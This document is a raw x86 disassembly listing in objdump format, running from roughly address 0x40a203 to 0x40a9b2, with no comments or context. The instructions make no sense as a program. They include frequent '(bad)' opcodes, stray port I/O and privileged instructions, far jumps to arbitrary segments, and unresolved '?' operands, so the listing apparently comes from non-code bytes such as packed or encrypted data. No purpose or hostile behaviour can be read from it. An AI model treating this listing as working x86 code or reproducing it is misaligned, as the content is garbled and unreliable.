  40a203:	lock add bh,BYTE PTR [eax-0x3807d1e8]
  40a20a:	(bad)
  40a20d:	ret    0x5254
  40a210:	pop    esp
  40a211:	not    BYTE PTR [ebx+0x19adbbcc]
  40a217:	lea    eax,[eax]
  40a219:	clc    
  40a21a:	jle    0x40a207
  40a21c:	jo     0x40a1dd
  40a21e:	je     0x40a21e
  40a220:	mov    ecx,0x896bf839
  40a225:	lahf   
  40a226:	mov    DWORD PTR ds:0x9b39ddc3,edx
  40a22c:	ror    dl,cl
  40a22e:	dec    ebp
  40a22f:	xchg   ebp,eax
  40a230:	sbb    eax,0x1601aa9
  40a235:	lods   eax,DWORD PTR ds:[esi]
  40a236:	mov    cl,0x5c
  40a238:	mov    cl,0x51
  40a23a:	or     BYTE PTR [eax-0xc],dh
  40a23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a23e:	dec    edx
  40a23f:	cdq    
  40a240:	xchg   DWORD PTR [ebp+0x48],ebx
  40a243:	pop    es
  40a244:	in     al,0x28
  40a246:	(bad)  
  40a248:	pop    esi
  40a249:	cs out 0x55,eax
  40a24c:	add    ah,dl
  40a24e:	dec    ebx
  40a24f:	test   BYTE PTR [edi],bl
  40a251:	in     eax,0x82
  40a253:	dec    edx
  40a254:	fdivr  st,st(2)
  40a256:	cmp    DWORD PTR [esi-0x80],ebp
  40a259:	adc    BYTE PTR [eax-0x27],ah
  40a25c:	fild   WORD PTR [esi+0x709cebc2]
  40a262:	in     al,0x34
  40a264:	lea    ebx,[ecx+0x42db1bd3]
  40a26a:	(bad)  
  40a26b:	lock fnstcw WORD PTR [ebp-0x70]
  40a26f:	push   ebx
  40a270:	or     eax,0xf8355e37
  40a275:	data16 arpl WORD PTR [ebx],bx
  40a278:	pop    fs
  40a27a:	sbb    eax,0x926cd554
  40a27f:	(bad)  
  40a280:	call   0x7c4d887d
  40a285:	push   es
  40a286:	push   0x6120fb06
  40a28b:	jmp    0x78d:0xd892e1e0
  40a292:	jle    0x40a280
  40a294:	dec    edi
  40a295:	lods   eax,DWORD PTR ds:[si]
  40a297:	in     eax,dx
  40a298:	xchg   ecx,eax
  40a299:	sbb    al,0xc4
  40a29b:	hlt    
  40a29c:	mov    ch,0xbb
  40a29e:	mov    dl,0x18
  40a2a0:	gs lea esi,cs:[edi+eax*8+0x40]
  40a2a6:	jno    0x40a25c
  40a2a8:	jge    0x40a27d
  40a2aa:	shl    DWORD PTR [eax-0x7d],cl
  40a2ad:	xchg   ecx,eax
  40a2ae:	scas   eax,DWORD PTR es:[edi]
  40a2af:	(bad)  
  40a2b0:	cmp    ch,BYTE PTR [eax+0x4]
  40a2b3:	mov    ?,esi
  40a2b5:	in     al,0x76
  40a2b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b8:	mov    ecx,0x3da2f651
  40a2bd:	xor    di,si
  40a2c0:	and    DWORD PTR [edi],edi
  40a2c2:	and    al,0x1a
  40a2c4:	jl     0x40a285
  40a2c6:	inc    ecx
  40a2c7:	fimul  DWORD PTR [eax]
  40a2c9:	mov    eax,ds:0x3d7abfda
  40a2ce:	jecxz  0x40a2dc
  40a2d0:	std    
  40a2d1:	clc    
  40a2d2:	mov    ss,WORD PTR [esi+ebp*2-0x3d]
  40a2d6:	sbb    al,0x19
  40a2d8:	outs   dx,BYTE PTR ds:[esi]
  40a2d9:	inc    esp
  40a2da:	clc    
  40a2db:	mov    db3,ecx
  40a2de:	ffree  st(5)
  40a2e0:	and    eax,0x2d51f48
  40a2e5:	call   0xe94d93b9
  40a2ea:	fwait
  40a2eb:	mov    esi,0xcfa5078d
  40a2f0:	ss push edi
  40a2f2:	aam    0x8c
  40a2f4:	dec    eax
  40a2f5:	ror    DWORD PTR [ebp+0x6492dd23],cl
  40a2fb:	inc    ebx
  40a2fc:	inc    eax
  40a2fd:	iret   
  40a2fe:	and    eax,0x1bd4d189
  40a303:	jbe    0x40a317
  40a305:	je     0x40a291
  40a307:	shr    ebx,0x5e
  40a30a:	push   edx
  40a30b:	xchg   BYTE PTR [esi+0x6f],dl
  40a30e:	std    
  40a30f:	or     ecx,ebx
  40a311:	repnz xor ebx,ecx
  40a314:	xlat   BYTE PTR ds:[ebx]
  40a315:	popf   
  40a316:	cmp    eax,0x8ec94420
  40a31b:	sahf   
  40a31c:	int3   
  40a31d:	int3   
  40a31e:	add    BYTE PTR [ebp+0x788bc280],dl
  40a324:	loopne 0x40a38f
  40a326:	(bad)
  40a32b:	js     0x40a389
  40a32d:	int    0x81
  40a32f:	pop    ds
  40a330:	iret   
  40a331:	mov    ebp,?
  40a333:	outs   dx,BYTE PTR ds:[esi]
  40a334:	xor    eax,0xffbc5890
  40a339:	and    DWORD PTR [ebx-0x5ccfce2d],ebp
  40a33f:	stos   DWORD PTR es:[edi],eax
  40a340:	fidiv  DWORD PTR [ebp-0x57]
  40a343:	mov    ah,0x51
  40a345:	inc    esi
  40a346:	addr16 mov esp,0xf16349bd
  40a34c:	inc    ebp
  40a34d:	daa    
  40a34e:	mov    ebx,0x41e7a187
  40a353:	push   es
  40a354:	std    
  40a355:	mov    DWORD PTR [edi+0x15c0ad3a],ecx
  40a35b:	imul   eax,DWORD PTR [esi+0x789d9d7c],0x65e9b61e
  40a365:	mov    al,0xb3
  40a367:	adc    BYTE PTR [eax+edx*1+0x4b],ah
  40a36b:	idiv   cl
  40a36d:	dec    esp
  40a36e:	daa    
  40a36f:	cmp    DWORD PTR [eax+0x202389e9],esp
  40a375:	mov    ecx,0x6aab7a5
  40a37a:	ins    DWORD PTR es:[edi],dx
  40a37b:	into   
  40a37c:	xchg   edx,eax
  40a37d:	push   edx
  40a37e:	retf   0x3dda
  40a381:	aad    0x6f
  40a383:	dec    ebp
  40a384:	and    BYTE PTR [edx+edi*1-0x17],dh
  40a388:	test   dl,ah
  40a38a:	mov    ebx,edx
  40a38c:	xchg   ebx,eax
  40a38d:	xchg   DWORD PTR [edx+eax*1+0x76],esi
  40a391:	hlt    
  40a392:	mov    dl,0xd5
  40a394:	jmp    0x5daf:0x7cdd2318
  40a39b:	outs   dx,DWORD PTR ds:[esi]
  40a39c:	sbb    BYTE PTR [edx],0x72
  40a39f:	enter  0xeb0d,0x8f
  40a3a3:	es hlt 
  40a3a5:	push   ss
  40a3a6:	cld    
  40a3a7:	cmp    BYTE PTR [esi-0x30],ch
  40a3aa:	into   
  40a3ab:	mov    ecx,0x87ccfee
  40a3b0:	sub    DWORD PTR [edx-0x6cff9a87],esi
  40a3b6:	repz push ss
  40a3b8:	adc    ch,ah
  40a3ba:	pop    ds
  40a3bb:	sbb    edi,0xa6449ba4
  40a3c1:	int    0x68
  40a3c3:	fwait
  40a3c4:	xlat   BYTE PTR ds:[ebx]
  40a3c5:	inc    esp
  40a3c6:	jnp    0x40a366
  40a3c8:	pop    ecx
  40a3c9:	sub    al,0xae
  40a3cb:	fsubr  QWORD PTR [edi-0x7d]
  40a3ce:	jne    0x40a3db
  40a3d0:	jmp    0xcc5f111c
  40a3d5:	jmp    0x40a3c3
  40a3d7:	daa    
  40a3d8:	add    BYTE PTR [ebx+0x6bdb30d9],ah
  40a3de:	ret    
  40a3df:	add    bl,BYTE PTR [ebx-0x27]
  40a3e2:	enter  0xd352,0xe4
  40a3e6:	mov    WORD PTR [eax+0x31804c0f],es
  40a3ec:	scas   al,BYTE PTR es:[edi]
  40a3ed:	loop   0x40a451
  40a3ef:	sub    al,0x2d
  40a3f1:	inc    ecx
  40a3f2:	stos   BYTE PTR es:[edi],al
  40a3f3:	stc    
  40a3f4:	dec    ebx
  40a3f5:	push   es
  40a3f6:	test   BYTE PTR [edi+0x66],0x1f
  40a3fa:	loopne 0x40a410
  40a3fc:	test   DWORD PTR [ebx-0x236aeb31],esi
  40a402:	pop    esi
  40a403:	and    DWORD PTR [edi+0x7f4e3985],0x43
  40a40a:	dec    edi
  40a40b:	add    edx,DWORD PTR [eax]
  40a40d:	rol    DWORD PTR [edx+edi*1-0x62ab00da],1
  40a414:	mov    ds:0xa5219e31,eax
  40a419:	in     eax,dx
  40a41a:	test   DWORD PTR [eax+0x199e8b34],0xd6f58c43
  40a424:	xchg   ebp,eax
  40a425:	imul   esp,DWORD PTR [edi+eiz*1],0x5efe5cf7
  40a42c:	xchg   cl,bl
  40a42e:	out    0x27,al
  40a430:	imul   esi,DWORD PTR [ebx],0xd7e97145
  40a436:	jmp    0x40a3ea
  40a438:	leave  
  40a439:	adc    al,0xfb
  40a43b:	ds jo  0x40a43e
  40a43e:	jl     0x40a3cd
  40a440:	std    
  40a441:	in     al,dx
  40a442:	or     cl,bh
  40a444:	aam    0xfb
  40a446:	jne    0x40a43f
  40a448:	mov    cs:0xf74cd618,al
  40a44e:	int    0x4
  40a450:	mov    dl,0xac
  40a452:	test   al,0xef
  40a454:	and    BYTE PTR [eax],bl
  40a456:	ss out 0xb7,al
  40a459:	sub    BYTE PTR [ebp-0x4e],ch
  40a45c:	hlt    
  40a45d:	arpl   WORD PTR [eax+edi*4+0x1d5de0da],dx
  40a464:	inc    ebx
  40a465:	pop    ss
  40a466:	or     edi,esi
  40a468:	dec    ebp
  40a469:	mov    esp,0xecc35e4
  40a46e:	or     bh,BYTE PTR [ecx+0x4e]
  40a471:	stos   DWORD PTR es:[edi],eax
  40a472:	mov    cl,0xfa
  40a474:	pop    ds
  40a475:	push   esp
  40a476:	mov    esp,0x2221a447
  40a47b:	punpcklwd mm7,mm0
  40a47e:	sub    eax,0x67237c18
  40a483:	cmp    al,0x4a
  40a485:	inc    edx
  40a486:	dec    edi
  40a487:	mov    ebp,esp
  40a489:	(bad)  
  40a48a:	jno    0x40a436
  40a48c:	xor    eax,0xbc5a702f
  40a491:	mov    WORD PTR [ebx*2-0x5966599],fs
  40a498:	(bad)  
  40a499:	jmp    0x5e1b:0xbc1890d8
  40a4a0:	inc    edx
  40a4a1:	int    0x2c
  40a4a3:	out    0xcc,al
  40a4a5:	loop   0x40a4b6
  40a4a7:	es adc al,0x1e
  40a4aa:	repz (bad) 
  40a4ac:	jge    0x40a4c6
  40a4ae:	jb     0x40a524
  40a4b0:	xor    eax,0xd2839811
  40a4b5:	xlat   BYTE PTR ds:[ebx]
  40a4b6:	cs push eax
  40a4b8:	jge    0x40a478
  40a4ba:	sub    DWORD PTR [ebp+0x69276e05],edi
  40a4c0:	mov    BYTE PTR es:[esi+0x12],0x28
  40a4c5:	and    eax,0xaee6693c
  40a4ca:	xchg   edx,eax
  40a4cb:	xchg   BYTE PTR [edx+0x65],dh
  40a4ce:	out    0x96,eax
  40a4d0:	in     al,dx
  40a4d1:	call   0x8602:0xeb16fcb6
  40a4d8:	cmp    BYTE PTR [esi-0x5e2e4e3a],0xbb
  40a4df:	mov    cl,0x99
  40a4e1:	xchg   ecx,eax
  40a4e2:	dec    ebx
  40a4e3:	pop    ss
  40a4e4:	test   ebp,eax
  40a4e6:	pop    ds
  40a4e7:	sub    BYTE PTR [edi+0x3e],0xc0
  40a4eb:	adc    ah,cl
  40a4ed:	sbb    cl,BYTE PTR [ebx]
  40a4ef:	mov    al,ds:0xbef0d736
  40a4f4:	sbb    DWORD PTR ds:0xef9a2cf2,ecx
  40a4fa:	or     BYTE PTR [ebp-0x528b0045],cl
  40a500:	cs es out 0xd6,eax
  40a504:	stos   BYTE PTR es:[edi],al
  40a505:	push   ebp
  40a506:	xor    edi,DWORD PTR [edx-0x50af17e]
  40a50c:	push   esi
  40a50d:	imul   edi,esp,0xc76a30f0
  40a513:	xor    dl,ah
  40a515:	gs push edi
  40a517:	jmp    0x54524dea
  40a51c:	inc    eax
  40a51d:	ins    DWORD PTR es:[edi],dx
  40a51e:	sbb    ah,BYTE PTR [edi]
  40a520:	aas    
  40a521:	inc    ecx
  40a522:	ret    
  40a523:	cdq    
  40a524:	push   cs
  40a525:	pop    esp
  40a526:	lea    ebp,[esi-0x76efcf43]
  40a52c:	cmp    cl,BYTE PTR [ebx-0x20]
  40a52f:	push   edx
  40a530:	loope  0x40a4c0
  40a532:	mov    ebx,0x1412dec8
  40a537:	ss out 0x8e,al
  40a53a:	sub    eax,0x86628d37
  40a53f:	hlt    
  40a540:	imul   edx,DWORD PTR [ebx+eiz*1],0xffffffc5
  40a544:	cmp    ch,BYTE PTR [edx-0x267c0b74]
  40a54a:	mov    bl,0xd8
  40a54c:	retf   0x400a
  40a54f:	sbb    edi,edi
  40a551:	cmp    DWORD PTR [ebp+0x2e],esp
  40a554:	or     ah,BYTE PTR [edi+eax*1+0x21]
  40a558:	(bad)
  40a55b:	inc    ecx
  40a55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a55d:	and    al,BYTE PTR [eax+0x1a]
  40a560:	pop    ds
  40a561:	fldcw  WORD PTR [eax]
  40a563:	sub    DWORD PTR [eax+edx*1+0x48a2e9c7],0xf87d1351
  40a56e:	out    dx,al
  40a56f:	mov    ebx,0x765cc157
  40a574:	inc    ebx
  40a575:	xchg   DWORD PTR [ebp+ebx*8+0x44a9bcb],edi
  40a57c:	xchg   BYTE PTR ds:0x4d691211,dl
  40a582:	bound  esp,QWORD PTR [eax-0x1c]
  40a585:	imul   esp,eax,0x4
  40a588:	mov    cl,0x60
  40a58a:	mov    edx,0x48b53428
  40a58f:	xchg   ecx,eax
  40a590:	add    eax,0xe8dbc38d
  40a595:	xlat   BYTE PTR ds:[ebx]
  40a596:	out    0xd0,al
  40a598:	sub    al,0xfd
  40a59a:	arpl   WORD PTR [edx-0x5dc8bcbb],cx
  40a5a0:	push   ebx
  40a5a1:	push   ebp
  40a5a2:	addr16 add eax,0xe83211e0
  40a5a8:	je     0x40a5c4
  40a5aa:	xor    DWORD PTR [ebp+0x25b7eeb3],ebp
  40a5b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5b1:	repz enter 0x8823,0xf1
  40a5b6:	push   esi
  40a5b7:	int3   
  40a5b8:	add    bh,BYTE PTR [edi+0x2a15bfa7]
  40a5be:	jl     0x40a56e
  40a5c0:	not    DWORD PTR [edx-0x4d]
  40a5c3:	pop    esi
  40a5c4:	fwait
  40a5c5:	pop    ebx
  40a5c6:	mov    esi,DWORD PTR [ebx+0x54bf1dc7]
  40a5cc:	mov    bl,0x80
  40a5ce:	sub    dh,BYTE PTR [ebx]
  40a5d0:	(bad)  
  40a5d1:	stos   DWORD PTR es:[edi],eax
  40a5d2:	pushf  
  40a5d3:	adc    al,0x93
  40a5d5:	fs jge 0x40a624
  40a5d8:	jns    0x40a640
  40a5da:	pop    ss
  40a5db:	xor    DWORD PTR [esi+0x50],0xe0502acc
  40a5e2:	and    DWORD PTR [eax+ebp*2+0x106d760a],0x65
  40a5ea:	dec    esp
  40a5eb:	adc    dh,bh
  40a5ed:	push   ebp
  40a5ee:	es test al,0xc0
  40a5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5f2:	test   BYTE PTR [esp+edx*4-0x2bc09eec],dh
  40a5f9:	jbe    0x40a635
  40a5fb:	or     eax,0xbe681445
  40a600:	(bad)  
  40a601:	jmp    0x40a668
  40a603:	scas   al,BYTE PTR es:[edi]
  40a604:	clc    
  40a605:	fcomi  st,st(0)
  40a607:	scas   eax,DWORD PTR es:[edi]
  40a608:	adc    ebx,esp
  40a60a:	jno    0x40a5ea
  40a60c:	popa   
  40a60d:	or     al,dh
  40a60f:	icebp  
  40a610:	gs push eax
  40a612:	daa    
  40a613:	scas   eax,DWORD PTR es:[edi]
  40a614:	cld    
  40a615:	inc    edi
  40a616:	adc    al,0xcb
  40a618:	call   0x393b:0x98e670b
  40a61f:	inc    esp
  40a620:	icebp  
  40a621:	daa    
  40a622:	mov    BYTE PTR [edi],ah
  40a624:	sbb    al,0xc3
  40a626:	mov    edi,0x7fe5d4bd
  40a62b:	pop    edi
  40a62c:	ins    BYTE PTR es:[edi],dx
  40a62d:	and    al,0x7
  40a62f:	gs inc esi
  40a631:	push   edx
  40a632:	mov    BYTE PTR [esi+0x513a9c85],cl
  40a638:	jg     0x40a600
  40a63a:	loopne 0x40a69a
  40a63c:	in     al,dx
  40a63d:	(bad)  
  40a63e:	sub    dh,BYTE PTR [ecx+edi*4-0x11f75af4]
  40a645:	xchg   edi,eax
  40a646:	or     esp,DWORD PTR [edx]
  40a648:	mov    ch,0x92
  40a64a:	xchg   ebp,eax
  40a64b:	sub    bh,ch
  40a64d:	xchg   ebx,eax
  40a64e:	div    DWORD PTR [esi-0x1b209d92]
  40a654:	mov    ebp,0x1abfe533
  40a659:	clc    
  40a65a:	cwde   
  40a65b:	jb     0x40a6d1
  40a65d:	sbb    ah,cl
  40a65f:	enter  0x58c2,0x73
  40a663:	dec    esi
  40a664:	jne    0x40a6e5
  40a666:	jae    0x40a5ff
  40a668:	sar    DWORD PTR [eax],1
  40a66a:	jbe    0x40a6bd
  40a66c:	push   es
  40a66d:	mov    eax,ds
  40a66f:	fs xchg ebp,eax
  40a671:	cmp    DWORD PTR [edi],esp
  40a673:	int3   
  40a674:	dec    esp
  40a675:	jae    0x40a613
  40a677:	inc    esi
  40a678:	ja     0x40a633
  40a67a:	out    dx,eax
  40a67b:	in     eax,0xb1
  40a67d:	loopne 0x40a6cd
  40a67f:	js     0x40a64a
  40a681:	mov    ds:0x121594fe,eax
  40a686:	inc    edx
  40a687:	pop    eax
  40a688:	dec    ebp
  40a689:	inc    ebx
  40a68a:	cmp    eax,DWORD PTR [ebx+0x5561bac]
  40a690:	cdq    
  40a691:	popa   
  40a692:	xchg   esp,eax
  40a693:	xchg   DWORD PTR [edi-0x59],ebp
  40a696:	jge    0x40a6a6
  40a698:	adc    al,BYTE PTR [ebx+0x2d]
  40a69b:	cwde   
  40a69c:	scas   al,BYTE PTR es:[edi]
  40a69d:	mov    ds:0x58941c7e,eax
  40a6a2:	test   al,0xa0
  40a6a4:	(bad)  
  40a6a5:	mov    edx,0xcfc46bd2
  40a6aa:	pop    es
  40a6ab:	mov    ah,0x3f
  40a6ad:	dec    ecx
  40a6ae:	shl    DWORD PTR [esi+edx*2+0x71],1
  40a6b2:	push   ebp
  40a6b3:	int3   
  40a6b4:	ret    0x7750
  40a6b7:	cmp    eax,0x50473aa8
  40a6bc:	xor    al,0xa9
  40a6be:	enter  0x8507,0xaa
  40a6c2:	je     0x40a66f
  40a6c4:	inc    ecx
  40a6c5:	imul   ecx,DWORD PTR [ebp-0x23],0xffffffde
  40a6c9:	add    BYTE PTR [edi],al
  40a6cb:	or     ah,BYTE PTR [ecx-0x6ba2ad52]
  40a6d1:	push   ecx
  40a6d2:	sbb    esp,eax
  40a6d4:	jb     0x40a70c
  40a6d6:	or     al,0x51
  40a6d8:	fisttp DWORD PTR [ebx-0x64781517]
  40a6de:	push   esp
  40a6df:	sub    esi,eax
  40a6e1:	leave  
  40a6e2:	cs sub eax,0x377f4f5
  40a6e8:	aaa    
  40a6e9:	mov    ds:0x518062f3,eax
  40a6ee:	inc    edi
  40a6ef:	sahf   
  40a6f0:	and    al,ch
  40a6f2:	push   ds
  40a6f3:	xchg   DWORD PTR [eax+eax*1-0x6c],edi
  40a6f7:	mov    ds:0x64de317c,al
  40a6fc:	outs   dx,DWORD PTR ds:[esi]
  40a6fd:	test   bh,0xb2
  40a700:	adc    edi,esp
  40a702:	pop    eax
  40a703:	fwait
  40a704:	mov    ecx,0xc52fb745
  40a709:	popf   
  40a70a:	stos   DWORD PTR es:[edi],eax
  40a70b:	push   esi
  40a70c:	shl    BYTE PTR [ebx-0x7e],0x80
  40a710:	cdq    
  40a711:	mov    dh,0x8b
  40a713:	adc    al,0xb9
  40a715:	sbb    ch,BYTE PTR [edx]
  40a717:	xor    eax,DWORD PTR [edx+0x410b324a]
  40a71d:	retf   0x7b6c
  40a720:	mov    al,0x35
  40a722:	inc    esp
  40a723:	add    eax,0xe82ad688
  40a728:	cmp    cl,BYTE PTR [edi-0x2]
  40a72b:	inc    esp
  40a72c:	repz push edx
  40a72e:	sub    BYTE PTR [eax-0x7b8f5cbd],ah
  40a734:	out    dx,al
  40a735:	js     0x40a704
  40a737:	adc    esp,ecx
  40a739:	add    ecx,eax
  40a73b:	pop    edx
  40a73c:	sar    DWORD PTR [edx+0x72daee],0xd2
  40a743:	out    0x82,eax
  40a745:	mov    dl,BYTE PTR [ebp+0x3a]
  40a748:	in     eax,0xec
  40a74a:	and    ah,BYTE PTR [eax-0x1e868f27]
  40a750:	pop    eax
  40a751:	inc    ebx
  40a752:	push   ebx
  40a753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a754:	out    0x1a,al
  40a756:	xchg   edx,eax
  40a757:	js     0x40a787
  40a759:	jle    0x40a731
  40a75b:	inc    eax
  40a75c:	into   
  40a75d:	pop    edi
  40a75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a75f:	mov    al,0x2f
  40a761:	pop    esi
  40a762:	or     eax,0xd8a45434
  40a767:	call   0xa11cf55b
  40a76c:	cmp    eax,0x92a62f93
  40a771:	repz retf 
  40a773:	push   edx
  40a774:	mov    al,0xd6
  40a776:	aas    
  40a777:	ja     0x40a7a3
  40a779:	add    BYTE PTR [edi+0xe],dl
  40a77c:	pop    esi
  40a77d:	inc    esi
  40a77e:	xchg   DWORD PTR [esi+0x3d265a1],edi
  40a784:	je     0x40a71e
  40a786:	shr    DWORD PTR [ecx+edx*4-0x44],1
  40a78a:	imul   BYTE PTR [edx+0x43bf2ea0]
  40a790:	mov    DWORD PTR [eax+edi*8+0x3e],ebx
  40a794:	cli    
  40a795:	icebp  
  40a796:	scas   eax,DWORD PTR es:[edi]
  40a797:	fdiv   DWORD PTR [edi+eax*2-0x40ab65cc]
  40a79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7a0:	push   es
  40a7a1:	sbb    cl,bl
  40a7a3:	push   edx
  40a7a4:	xchg   edx,eax
  40a7a5:	cld    
  40a7a6:	mov    ebp,0xa8c36e1c
  40a7ab:	dec    eax
  40a7ac:	inc    ebp
  40a7ad:	mov    ebx,0x3a4b4270
  40a7b2:	add    DWORD PTR [edi-0x5c4c7f6f],ebx
  40a7b8:	dec    ebp
  40a7b9:	nop    DWORD PTR ds:0x2add86fd
  40a7c0:	inc    esp
  40a7c1:	jl     0x40a764
  40a7c3:	sub    edx,edx
  40a7c5:	pop    esp
  40a7c6:	mov    BYTE PTR [edi],al
  40a7c8:	mov    ecx,0x707a2dfd
  40a7cd:	(bad)  
  40a7ce:	mov    ecx,0xcd73987d
  40a7d3:	pop    esi
  40a7d4:	in     al,0x8f
  40a7d6:	sbb    eax,0x308c47ba
  40a7db:	into   
  40a7dc:	in     eax,dx
  40a7dd:	lds    edi,FWORD PTR [ebp+0x1d]
  40a7e0:	cmp    al,0x9f
  40a7e2:	xchg   ebx,eax
  40a7e3:	and    edi,0x6f
  40a7e6:	jmp    0xcdd38108
  40a7eb:	outs   dx,BYTE PTR ds:[esi]
  40a7ec:	aad    0x6b
  40a7ee:	fbstp  TBYTE PTR [eax]
  40a7f0:	sub    eax,0x550600fc
  40a7f5:	dec    esp
  40a7f6:	or     ah,BYTE PTR [edi-0x5b8d58e9]
  40a7fc:	pop    esp
  40a7fd:	call   0xf154:0x7f5a4887
  40a804:	mov    ch,BYTE PTR [ebx+0x78]
  40a807:	mov    esp,0x26291cfa
  40a80c:	dec    edi
  40a80d:	or     al,BYTE PTR [eax]
  40a80f:	fnstenv [edi+0x2a6762d5]
  40a815:	inc    esi
  40a816:	mov    cl,0x2b
  40a818:	sbb    eax,0xd0de0f93
  40a81d:	shr    ebx,cl
  40a81f:	dec    edi
  40a820:	fsub   DWORD PTR ds:0xd44e0f21
  40a826:	fimul  DWORD PTR [ebx-0xe]
  40a829:	scas   al,BYTE PTR es:[edi]
  40a82a:	pop    ecx
  40a82b:	xor    eax,0x3e828b06
  40a830:	loop   0x40a89a
  40a832:	jnp    0x40a804
  40a834:	je     0x40a7be
  40a836:	ja     0x40a873
  40a838:	daa    
  40a839:	or     eax,ebp
  40a83b:	aam    0x3a
  40a83d:	cmp    al,0xd4
  40a83f:	lock dec eax
  40a841:	or     DWORD PTR [esp+edi*2-0x1d],eax
  40a845:	int3   
  40a846:	add    al,0x18
  40a848:	sahf   
  40a849:	push   esp
  40a84a:	fcomip st,st(7)
  40a84c:	into   
  40a84d:	dec    esi
  40a84e:	(bad)  
  40a84f:	cdq    
  40a850:	ins    BYTE PTR es:[edi],dx
  40a851:	stos   BYTE PTR es:[edi],al
  40a852:	shr    eax,0x6f
  40a855:	sbb    ah,BYTE PTR [ecx+0x4a]
  40a858:	or     DWORD PTR [ecx+0xa],esp
  40a85b:	mov    WORD PTR [edi-0x910f6c6],cs
  40a861:	push   esi
  40a862:	xlat   BYTE PTR ds:[ebx]
  40a863:	sub    ebx,esp
  40a865:	arpl   bp,ax
  40a867:	iret   
  40a868:	ss sbb eax,0xe06403c0
  40a86e:	jbe    0x40a81f
  40a870:	(bad)  
  40a872:	and    bl,BYTE PTR [eax]
  40a874:	gs into 
  40a876:	js     0x40a8b6
  40a878:	imul   eax,DWORD PTR [edx+0x24a2601c],0xdf06b1df
  40a882:	or     eax,0x1516c94
  40a887:	inc    ebp
  40a888:	nop
  40a889:	add    esp,esp
  40a88b:	mov    ds:0xd236c8e6,al
  40a890:	add    dh,BYTE PTR [edi+edx*1]
  40a893:	mov    esi,0x4c1f50cd
  40a898:	and    eax,0x90a5063
  40a89d:	shl    BYTE PTR [ecx-0x39],1
  40a8a0:	in     al,0xc2
  40a8a2:	ins    DWORD PTR es:[edi],dx
  40a8a3:	addr16 dec ebp
  40a8a5:	cmp    ecx,DWORD PTR [ecx+0x31cedea0]
  40a8ab:	cmp    esp,DWORD PTR [ecx-0x22]
  40a8ae:	adc    al,0x20
  40a8b0:	sub    eax,0xdb94e0fe
  40a8b5:	mov    ebp,DWORD PTR [eax+0x5ca56d7e]
  40a8bb:	adc    DWORD PTR ds:0xd037fc14,0x40
  40a8c2:	inc    edi
  40a8c3:	mov    WORD PTR [edx+0x66],?
  40a8c6:	sub    ch,BYTE PTR [esi]
  40a8c8:	sbb    BYTE PTR [edi+0x7e],dh
  40a8cb:	pop    es
  40a8cc:	data16 daa 
  40a8ce:	and    eax,DWORD PTR [edi]
  40a8d0:	popf   
  40a8d1:	adc    al,0x1e
  40a8d3:	pop    edx
  40a8d4:	xchg   ecx,eax
  40a8d5:	push   ebp
  40a8d6:	jne    0x40a923
  40a8d8:	mov    ds:0x4d43a83c,al
  40a8dd:	sbb    bp,bp
  40a8e0:	jbe    0x40a92b
  40a8e2:	and    esp,DWORD PTR [ecx]
  40a8e4:	clc    
  40a8e5:	dec    edi
  40a8e6:	adc    al,0xf3
  40a8e8:	fnstenv [edx-0x20d8647]
  40a8ee:	or     BYTE PTR [ebp-0x1b4f4c3c],dh
  40a8f4:	repz jecxz 0x40a914
  40a8f7:	sub    DWORD PTR es:[edx],edi
  40a8fa:	int3   
  40a8fb:	sub    al,0x1e
  40a8fd:	popf   
  40a8fe:	test   BYTE PTR [eax+0x3be452b5],bh
  40a904:	pop    es
  40a905:	cmc    
  40a906:	xor    eax,0xe490c5bb
  40a90b:	add    ch,BYTE PTR [ebx+0x53]
  40a90e:	dec    eax
  40a90f:	dec    DWORD PTR [edx+0x56]
  40a912:	mov    eax,0x9f172a32
  40a917:	retf   
  40a918:	sbb    al,0xfb
  40a91a:	dec    ecx
  40a91b:	xor    eax,0x237fae4a
  40a920:	inc    ebx
  40a921:	clc    
  40a922:	xchg   ebx,eax
  40a923:	sbb    ebp,ecx
  40a925:	xchg   BYTE PTR [esi-0x27],al
  40a928:	cmp    edx,esp
  40a92a:	sbb    dl,bh
  40a92c:	sar    ch,0xec
  40a92f:	inc    ebx
  40a930:	sbb    BYTE PTR [ebp+0x3c],0x99
  40a934:	xor    eax,DWORD PTR [edi-0x1433e45d]
  40a93a:	pop    esp
  40a93b:	subps  xmm5,XMMWORD PTR [esi+0x400c2cc7]
  40a942:	sub    ebp,DWORD PTR [edx+0x75843640]
  40a948:	aad    0x28
  40a94a:	jnp    0x40a8e2
  40a94c:	jle    0x40a967
  40a94e:	into   
  40a94f:	pushf  
  40a950:	das    
  40a951:	pusha  
  40a952:	aas    
  40a953:	ret    0x4c1
  40a956:	mov    ah,0x92
  40a958:	xor    ch,BYTE PTR [ecx]
  40a95a:	jle    0x40a9ae
  40a95c:	adc    dl,BYTE PTR [ebx]
  40a95e:	jp     0x40a9a7
  40a960:	sahf   
  40a961:	mov    ss,WORD PTR [ebx+ebp*1-0x300ecfab]
  40a968:	pop    esi
  40a969:	adc    dh,bh
  40a96b:	enter  0x8f23,0x99
  40a96f:	es mov bl,0x2f
  40a972:	jecxz  0x40a947
  40a974:	fidivr DWORD PTR [edx+eax*8-0x65f3025c]
  40a97b:	sti    
  40a97c:	(bad)  
  40a97e:	or     edi,edx
  40a980:	push   ebx
  40a981:	mov    edx,0xdc7c7fb0
  40a986:	fdiv   QWORD PTR [edi]
  40a988:	push   0xb0de7643
  40a98d:	fistp  DWORD PTR [ecx+0x38]
  40a990:	xor    dl,BYTE PTR [esp+ebx*4+0x17f7f399]
  40a997:	pop    edx
  40a998:	mov    ecx,0x767efaa1
  40a99d:	add    DWORD PTR [ebx],edi
  40a99f:	fcom   QWORD PTR [ecx-0x7c]
  40a9a2:	push   ecx
  40a9a3:	adc    al,0xc3
  40a9a5:	inc    edx
  40a9a6:	mov    ch,0xb7
  40a9a8:	out    dx,eax
  40a9a9:	retf   
  40a9aa:	jno    0x40a998
  40a9ac:	push   ss
  40a9ad:	jp     0x40a9cb
  40a9af:	fld    TBYTE PTR [ebx]
  40a9b1:	scas   al,BYTE PTR es:[edi]
  40a9b2:	scas   al,BYTE PTR es:[edi]
